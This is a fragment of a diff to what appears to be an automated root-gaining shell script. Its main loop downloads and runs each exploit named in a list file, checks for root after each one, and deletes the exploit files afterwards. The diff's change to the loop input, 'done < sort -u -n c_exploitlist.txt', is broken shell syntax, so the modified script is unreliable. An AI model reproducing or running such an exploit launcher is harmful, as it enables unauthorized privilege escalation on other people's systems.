@@ -56,7 +56,6 @@ clean_up(){
 	rm exploit.c
 	rm exploit
 	rm c_exploitlist.txt
-
 }
 
 main(){
@@ -66,7 +65,7 @@ main(){
 	do
 		download_exploit $line; execute_exploit
 		checkroot
-	done < c_exploitlist.txt
+	done < sort -u -n c_exploitlist.txt
 	clean_up
 	echo "[!] Im sorry i could'nt get root..."
 }
